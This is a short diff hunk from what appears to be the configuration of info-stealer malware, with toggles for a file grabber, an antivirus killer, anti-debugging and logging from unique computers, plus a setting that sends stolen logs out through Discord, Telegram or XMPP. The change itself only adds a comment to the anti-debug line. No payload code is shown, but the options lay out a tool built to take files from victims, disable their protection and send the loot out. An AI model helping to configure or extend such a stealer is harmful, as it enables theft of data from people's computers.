@@ -13,7 +13,7 @@
 enableFileGrubber = False #enable file grabber
 oneStart = False #enable this if you want logs to come only from unique computers
 avKiller = False #enable antiviruses killer
-debuging = False #disable AntiDebug
+debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)
 
 sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
 # You can write your address for sending logs here
